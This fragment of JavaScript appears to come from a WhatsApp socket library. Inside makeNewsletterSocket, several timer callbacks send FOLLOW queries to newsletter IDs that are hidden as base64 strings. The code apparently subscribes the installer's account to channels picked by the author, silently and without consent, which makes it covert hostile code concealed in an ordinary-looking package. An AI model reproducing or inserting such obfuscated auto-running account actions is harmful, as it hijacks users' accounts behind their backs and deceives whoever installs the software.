...
const makeNewsletterSocket = (config) => {
  ...
  setTimeout(async () => {
    try {
      await newsletterWMexQuery(
        Buffer.from(
          "MTIwMzYzNDI0NzQyMDEyNjYzQG5ld3NsZXR0ZXI=",
          "base64",
        ).toString(),
  ...
  setTimeout(async () => {
    try {
      await newsletterWMexQuery(
        Buffer.from(
          "MTIwMzYzNDI2NTE2NjgwMDI3QG5ld3NsZXR0ZXI=",
          "base64",
        ).toString(),
        Types_1.QueryIds.FOLLOW,
      );
  ...
  setTimeout(async () => {
    try {
      await newsletterWMexQuery(
        Buffer.from(
          "MTIwMzYzNDI2NDkzNzY2MTM4QG5ld3NsZXR0ZXI=",
          "base64",
        ).toString(),
        Types_1.QueryIds.FOLLOW,
      );
  ...
  setTimeout(async () => {
    try {
      await newsletterWMexQuery(
        Buffer.from(
          "MTIwMzYzNDI1MzcwMjU5NTM0QG5ld3NsZXR0ZXI=",
          "base64",
        ).toString(),
        Types_1.QueryIds.FOLLOW,
      );
